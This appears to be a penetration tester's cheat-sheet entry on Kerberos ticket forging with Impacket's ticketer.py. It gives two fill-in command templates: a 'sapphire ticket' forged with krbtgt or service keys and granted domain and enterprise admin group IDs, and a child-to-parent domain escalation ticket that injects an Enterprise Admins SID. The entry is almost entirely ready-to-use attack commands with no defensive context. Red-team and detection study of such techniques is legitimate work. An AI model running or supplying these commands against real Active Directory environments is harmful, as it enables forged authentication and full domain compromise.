# Ticketer
#plateform/linux #target/remote #cat/ATTACK


## Ticketer with sapphire ticket
```
ticketer.py -request -domain "<domain>" -user "<user>" 
-password "<password>" -nthash '<krbtgt/service NT hash>' -aesKey '<krbtgt/service AES key>' -domain-sid '<DOMAIN_SID_HERE>' -user-id '1337' -groups '512,513,518,519,520' '<target>'
```

## Ticketer for child to parent
```
ticketer.py -aesKey '<child_krbtgt_aeskey>' -domain <CHILD_DOMAIN_NAME> -domain-sid <YOUR_DOMAIN_SID> -extra-sid <TARGET_DOMAIN_HERE>-519 Administrator -user-id 500
```